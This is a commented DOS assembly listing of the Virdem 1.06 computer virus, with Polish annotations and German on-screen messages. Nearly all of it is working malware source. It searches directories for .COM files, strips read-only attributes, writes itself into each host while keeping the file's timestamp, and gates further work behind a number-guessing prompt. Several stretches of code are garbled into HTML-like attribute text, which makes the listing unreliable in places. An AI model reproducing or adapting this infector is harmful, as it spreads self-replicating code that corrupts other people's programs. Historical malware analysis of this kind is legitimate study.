

LF	EQU	0AH
CR	EQU	0DH

S0000	SEGMENT
	ASSUME DS:S0000, SS:S0000 ,CS:S0000 ,ES:S0000
	ORG	$+0100H

L0100:	NOP
	NOP
	NOP
	MOV	SP,0FE00h
L0106:	PUSH	AX
	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	BP
	PUSH	SI
	PUSH	DI
	PUSH	DS
	PUSH	ES
	PUSH	SS
	PUSHF
	MOV	SI,80H
	LEA	DI,L03D7		;przepisana command line
	MOV	CX,20H
	REPZ	MOVSB
	MOV	AX,0
	MOV	ES:[L03A7],AX		;numer obslugiwanego katalogu
	MOV	BL,ES:[L0445]		;numer generacji
	CMP	BL,'9'
	JZ	L0130
	INC	BL
L0130:	MOV	ES:[L0445],BL		;numer generacji
	MOV	AH,19H			;Get current disk
	INT	21H
	MOV	CS:[L03F9],AL		;entry current disk
	MOV	AH,47H			;get current directory
	MOV	DH,0
	ADD	AL,1
	MOV	DL,AL			;drive number
	LEA	SI,L03FB		;pointer to 64-byte directory
	INT	21H
	JMP	SHORT	L016D

	NOP

;-------------------------------
L014E:	MOV	AH,40H		;Write handle
	MOV	BX,1		;handle
	MOV	CX,2CH		;bytes
	NOP
	LEA	DX,L05C5	;'Alle Ihre Programme sind/nun infiziert.'
	INT	21H
	MOV	DX,CS:[L03A9]
	MOV	CS:[0FD00h],DX
	JMP	L02E4

;-------------------------------
L016A:	JMP	L02E4

;-------------------------------< cd="" sekwencji="" poczatkowej="" l016d:="" mov="" dl,0="" ;a:="" mov="" ah,0eh="" ;set="" default="" drive="" int="" 21h="" mov="" ah,3bh="" ;set="" default="" directory="" lea="" dx,l03f7="" ;'\'="" int="" 21h="" jmp="" short="" l01c9="" nop="" ;-------------------------------="" l017e:="" mov="" ah,3bh="" ;change="" current="" directory="" lea="" dx,l03f7="" ;'\'="" int="" 21h="" mov="" ah,4eh="" ;find="" first="" file="" mov="" cx,11h="" ;attributes="" (ro="" dir)="" lea="" dx,l03b1="" ;'*'="" int="" 21h="" jb="" l014e="" ;-=""> koniec
	MOV	BX,CS:[L03A7]		;numer obslugiwanego katalogu
	INC	BX
	DEC	BX
	JZ	L01A5			;-> pierwszy raz ?

L019C:	MOV	AH,4FH			;Find next file
	INT	21H
	JB	L014E			;-> koniec
	DEC	BX
	JNZ	L019C
L01A5:	MOV	AH,2FH			;get DTA
	INT	21H
	ADD	BX,1CH			;ES:BX - DTA
	MOV	WORD PTR ES:[BX],5C20h	;'\ '
	INC	BX
	PUSH	DS
	MOV	AX,ES
	MOV	DS,AX
	MOV	DX,BX
	MOV	AH,3BH			;change current directory
	INT	21H
	POP	DS
	MOV	BX,CS:[L03A7]		;numer obslugiwanego katalogu
	INC	BX
	MOV	CS:[L03A7],BX		;numer obslugiwanego katalogu
L01C9:	MOV	AH,4EH			;Find first file
	MOV	CX,1			;attribute - RO
	LEA	DX,L03AB		;'*.com'
	INT	21H
	JB	L017E			;-> koniec
	MOV	BX,ES:L03A7		;numer obslugiwanego katalogu
	CMP	BX,0
	JZ	L01E3			;-> root
	JMP	SHORT	L01E9		;->subdir

	NOP

L01E3:	MOV	AH,4FH			;Find next file
	INT	21H
	JB	L017E			;-> koniec
L01E9:	MOV	AH,3DH			;Open Handle
	MOV	AL,2			;access code R/W
	MOV	DX,9EH			;pointer to pathname
	INT	21H
	MOV	BX,AX
	MOV	AH,3FH			;Read handle
	MOV	CX,0500h		;bytes to read
	NOP
	MOV	DX,0F800h		;bufor wejscia
	NOP
	INT	21H
	MOV	AH,3EH			;Close Handle
	INT	21H
	MOV	BX,CS:[0F800h]		;czy zaczyna sie od dwoch NOP'ow ?
	CMP	BX,9090h
	JZ	L01E3			;-> tak, nastepny zbior
	MOV	AH,43H			;Get file attributes
	MOV	AL,0
	MOV	DX,9EH			;ptr to pathname
	INT	21H
	MOV	AH,43H			;Set file attributes
	MOV	AL,1
	AND	CX,0FEH			;stare - RO
	INT	21H
	MOV	AH,3DH			;Open handle
	MOV	AL,2			;RW
	MOV	DX,9EH			;path
	INT	21H
	MOV	BX,AX			;handle
	MOV	AH,57H			;Get file date/time
	MOV	AL,0
	INT	21H
	PUSH	CX			;time
	PUSH	DX			;date
	MOV	AH,42H			;move file ptr
	MOV	AL,2			;EOF
	MOV	DX,0
	MOV	CX,0
	INT	21H
	TEST	AX,8000h		;new location
	JNZ	L024F			;-> ponad 32KB
	CMP	AX,0500h
	NOP
	JA	L024F			;ponad 1.25KB
	CALL	L0398
L024F:	PUSH	AX			;wielkosc zbioru low
	PUSH	DX			;wielkosc zbioru high
	MOV	AH,40H			;Write handle
	MOV	CX,0500h
	NOP
	MOV	DX,0F800h		;adres bufora (wczytany poczatek zb.)
	NOP
	INT	21H
	POP	DX			;wielkosc zbioru high
	POP	AX
	ADD	AX,0100h		;poczatek przepisanej czesci
	MOV	ES:[L02BD],AX
	ADD	AX,0500h		;adres konca
	NOP
	MOV	DX,CS:[L03A9]
	MOV	CS:[0FD00h],DX
	MOV	ES:[L03A9],AX
	MOV	AH,40H			;write handle
	MOV	CX,38H			;wielkosc dopisanej czesci
	NOP
	LEA	DX,L0287		;dopisywana procedura
	INT	21H
	JMP	SHORT	L02C0

	NOP

;-------------------------------------------------------------------------
;	NA KONIEC ZBIORU - wystartowanie wlasciwego programu
;-------------------------------------------------------------------------
L0287:	MOV	DI,80H
	LEA	SI,L03D7		;przepisana command line
	MOV	CX,20H			;wielkosc
	REPZ	MOVSB
	CALL	L0296			;
L0296:	POP	AX			;adres tego miejsca (L0296)
	MOV	BX,27H			;razem adres 2BD
	NOP
	ADD	AX,BX
	MOV	SI,AX
	MOV	BX,ES:[SI]		;adres poczatku czesci przepisanej
	MOV	SI,BX
	MOV	DI,0100h		;cel
	MOV	CX,0500h		;dlugosc
	NOP
	REPZ	MOVSB
	POPF
	POP	SS
	POP	ES
	POP	DS
	POP	DI
	POP	SI
	POP	BP
	POP	DX
	POP	CX
	POP	BX
	POP	AX
	MOV	AX,OFFSET L0100
	PUSH	AX
	RETN				;start zarazonego programu

L02BD	dw	0			;adres przepisanego bufora
;-------------------------------------------------------------------------
;	KONIEC dopisywanego kawalka
;-------------------------------------------------------------------------

	NOP
L02C0:	MOV	AH,42H			;Move file ptr
	MOV	AL,0			;BOF
	MOV	DX,0
	MOV	CX,0
	INT	21H
	MOV	AH,40H			;Write handle
	MOV	CX,0500h		;dlugosc
	NOP
	LEA	DX,L0100		;ten program
	INT	21H
	MOV	AH,57H			;set file date/time
	MOV	AL,1
	POP	DX
	POP	CX
	INT	21H
	MOV	AH,3EH			;close file
	INT	21H
L02E4:	NOP
	CALL	L0386
	MOV	BL,ES:L0445		;numer generacji
	CMP	BL,'1'
	JNZ	L0305			;<> 1 ->
	MOV	AH,40H			;write handle
	MOV	BX,1
	MOV	CX,5EH			;dlugosc
	NOP
	LEA	DX,L0427		;'Virdem Ver.: 1.06 (Generation 0) aktiv.'
	INT	21H
	MOV	AH,0
	INT	21H			;-> exit

					;<- generacja=""> 1
L0305:	MOV	AH,40H
	MOV	BX,1
	MOV	CX,0106h
	NOP
	LEA	DX,L0427		;'Virdem Ver.: 1.06 (Generation 0) aktiv...'
	INT	21H
	MOV	AH,2			;Display character
	MOV	BL,ES:L0445		;numer generacji
	MOV	DL,BL
	INT	21H
				;<- generacja="" liczby="" przypadkowej="" mov="" ah,2ch="" ;get="" time="" int="" 21h="" mov="" al,bl="" and="" al,0fh="" mov="" bx,offset="" l041c="" xlat="" mov="" bh,al="" and="" dx,0ffh="" mov="" ah,0="" mov="" dh,0="" mov="" al,dl="" mov="" dl,bh="" div="" dl="" mov="" dl,al="" or="" dl,30h="" mov="" ah,0ch="" ;flush="" buffer="" read="" keyboard="" mov="" al,1="" int="" 21h="" cmp="" dl,al="" jz="" l0371="" ;-=""> trafiony zatopiony

	MOV	BL,DL			;<- wyswietlenie="" prawdziwej="" wartosci="" mov="" ah,2="" mov="" dl,'="" '="" int="" 21h="" mov="" dl,'="">'
	INT	21H
	MOV	DL,BL
	INT	21H
	MOV	DL,'<' int="" 21h="" mov="" ah,40h="" ;write="" handle="" mov="" bx,1="" mov="" cx,5ch="" ;liczba="" bajtow="" nop="" lea="" dx,l052e="" ;'bedauerlicherweise="" war="" ihre="" ...'="" int="" 21h="" mov="" ah,0="" ;end="" programm="" int="" 21h=""></'><- trafiony="" zatopiony="" l0371:="" mov="" ah,40h="" ;write="" handle="" mov="" bx,1="" mov="" cx,39h="" nop="" lea="" dx,l058b="" ;'bravo.="" richtige="" antwort...'="" int="" 21h="" mov="" ax,es:[0fd00h]="" ;wejscie="" w="" procedure="" startowa="" push="" ax="" retn="" ;----------------------------------------------------------------------------="" ;="" podprogram="" wykonywany="" po="" zarazeniu="" ;----------------------------------------------------------------------------="" l0386:="" mov="" ah,0eh="" ;select="" disk="" mov="" dl,cs:l03f9="" ;entry="" current="" disk="" int="" 21h="" mov="" ah,3bh="" ;set="" date="" lea="" dx,l03fa="" ;month/year="" ;cx="year" int="" 21h="" retn="" ;----------------------------------------------------------------------------="" ;="" podprogram="" dla="" zbiorow="" mniejszych="" od="" 500h="" ;----------------------------------------------------------------------------="" l0398:="" mov="" ah,42h="" ;move="" file="" ptr="" mov="" al,0="" ;bof="" +="" offset="" mov="" dx,0500h="" nop="" mov="" cx,0="" int="" 21h="" retn="" ;----------------------------------------------------------------------------="" ;="" dane="" ;----------------------------------------------------------------------------="" l03a6="" db="" 0="" l03a7="" dw="" 0="" ;numer="" obslugiwanego="" katalogu="" l03a9="" dw="" 600h="" l03ab="" db="" '*.com',0="" l03b1="" db="" '*',0="" l03b3="" db="" 0ffh="" db="" 0,0,0,0,0,'?',0,'????????exe',0,0,0,0,0="" l03cb="" db="" '????????com',0="" l03d7="" db="" 0,0,0,0,0,0,0,0,0,0,0,0,0,0="" ;przepisana="" command="" line="" db="" 0,0,0,0,0,0,0,0,0,0,0,0,0,0="" db="" 0,0,0,0="" l03f7="" db="" '\',0="" l03f9="" db="" 0="" ;entry="" current="" disk="" l03fa="" db="" '\'="" l03fb="" db="" 0,0,0,0,0,0,0,0,0,0,0,0,0,0="" ;entry="" current="" directory="" db="" 0,0,0,0,0,0,0,0,0,0,0,0,0,0="" db="" 0,0,0,0,0="" ;tablica="" translacji="" l041c="" db="" 0ffh,32h,22h,19h,14h,12h,0fh,0dh,0bh,0ah,0ffh="" l0427="" db="" 'virdem="" ver.:="" 1.06="" (generation="" '="" l0445="" db="" '0)="" aktiv.'="" db="" lf,cr,'copyright="" by="" r.burger="" 1986,1987'="" db="" lf,cr,'tel.:="" 05932/5451'="" db="" lf,cr="" db="" lf,cr="" db="" 'dies="" ist="" ein="" demoprogramm="" fuer'="" db="" lf,cr,'computerviren.="" geben="" sie="" nun'="" db="" lf,cr,'bitte="" eine="" zahl="" ein.'="" db="" lf,cr,'wenn="" sie="" richtig="" raten,duerfen'="" db="" lf,cr,'sie="" weiterarbeiten.'="" db="" lf,cr,'die="" zahl="" liegt="" zwischen'="" db="" lf,cr,'0="" und="" '="" db="" 0="" l052e="" db="" lf,cr,'bedauerlicherweise="" war="" ihre'="" db="" lf,cr,'antwort="" nicht="" richtig.'="" db="" lf,cr,'mehr="" glueck="" beim="" naechsten="" mal="" ....'="" db="" lf,cr="" db="" 0="" l058b="" db="" lf,cr,'bravo.="" richtige="" antwort.'="" db="" lf,cr,'sie="" duerfen="" weiterarbeiten.'="" db="" lf,cr="" db="" 0="" l05c5="" db="" lf,cr,'alle="" ihre="" programme="" sind'="" db="" lf,cr,'nun="" infiziert.'="" ;(odtad="" zainfekowane)="" db="" lf,cr="" db="" 0="" s0000="" ends="" end="" l0100="" =""></-></-></-></->